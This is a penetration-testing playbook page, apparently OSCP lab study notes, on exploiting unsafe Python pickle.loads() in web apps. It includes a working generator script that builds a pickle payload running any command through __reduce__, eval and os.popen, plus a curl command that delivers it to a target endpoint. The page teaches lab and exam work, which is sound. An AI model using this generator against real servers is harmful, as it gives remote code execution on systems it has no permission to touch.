# Linux - Python Pickle

**Step 9C of 50 · Linux/Web**

*Recognise attacker-controlled `pickle.loads()` as code execution and prove it with a harmless response-channel command.*

## When to open this stage

Open this page only after source review shows that request-controlled data reaches `pickle.loads()` or an equivalent unsafe Python deserializer. The source should also tell you how the request is decoded, such as URL-safe base64 before unpickling.

## Run this

Create a protocol-2 payload generator that returns the output in the application's reflected field:

~~~bash
cat > "$BoxDir/exploits/mkpickle.py" <<'PY'
#!/usr/bin/env python3
import base64
import pickle
import sys

class Proof:
    def __reduce__(self):
        command = sys.argv[1]
        expression = "{'Subject': __import__('os').popen(%r).read()}" % command
        return (eval, (expression,))

if len(sys.argv) != 2:
    raise SystemExit("usage: mkpickle.py COMMAND")

payload = pickle.dumps(Proof(), protocol=2)
print(base64.urlsafe_b64encode(payload).decode())
PY

boxset PickleURL "http://$BoxIP:$WebPort/newpost"
Payload="$(python3 "$BoxDir/exploits/mkpickle.py" id)"
curl -sS -X POST \
  --data-binary "$Payload" \
  -H 'Content-Type: application/octet-stream' \
  "$PickleURL" | tee "$BoxDir/loot/pickle-id.txt"
~~~

## Example output

~~~text
POST RECEIVED: uid=...(...)
~~~

The important proof is that the response contains output from `id`, not the exact UID or group list. This proves the request reached the unsafe loader and that the server executed the command.

## What did you get?

- [ ] The response contains `uid=` → **Record the execution identity, then use [[Linux - XXE]] or [[Linux - Credential Search]] for the stable SSH-key or credential path**
- [ ] The request returns a decoding or unpickling error → **Confirm URL-safe base64, protocol 2 compatibility, raw request bytes, and the source's expected field or endpoint**
- [ ] The request hangs while waiting for a callback → **Stop waiting, keep the response-channel proof, and choose a disclosed SSH or credential route**
- [ ] The source uses a safe serializer or validates a signed object → **Do not force pickle payloads; return to [[Linux - Web Enum]] and inspect the next source or application branch**

## Why the payload works

`pickle` stores instructions for rebuilding objects, not just a data format. The `__reduce__` method supplies a callable and arguments. During deserialization, the target calls `eval`, which evaluates an expression that runs the harmless identity command and places its output in the `Subject` field expected by the application.

The exact payload must match the source-disclosed decoder:

- `base64.urlsafe_b64decode()` requires URL-safe base64.
- An older target Python may require protocol 2.
- `request.data` means the request body must contain the payload bytes, not form data.
- The response field determines where command output can be observed.

## Notes and gotchas

- Prove `id` first. A callback is a delivery mechanism, not the initial vulnerability proof.
- Do not run the generator against untrusted pickle files on Kali.
- Keep the serialized payload and response in `$BoxDir`; do not paste private credentials or flags into the report.
- A source disclosure can reveal a key path even when the pickle response channel is unreliable.
- After a stable shell is obtained, continue with [[Linux - Local Enum]] and [[Linux - Credential Search]].

## Seen in

- [[OSCP/BOXES/WRITE UPS/Linux/DevOops|DevOops]] -- Flask source disclosure exposed `pickle.loads()`, and a harmless `id` payload proved execution

## Related stages

- [[Linux - XXE]]
- [[Linux - RCE to Shell]]
- [[Linux - Local Enum]]
- [[Linux - Credential Search]]
- [[Linux - Clean Down]]

## External Resources

- https://docs.python.org/3/library/pickle.html
- https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data

## Why this matters for OSCP

This stage teaches source-driven deserialization testing: identify the decoder, prove execution through the existing response, and choose the most reliable shell path disclosed by the application.
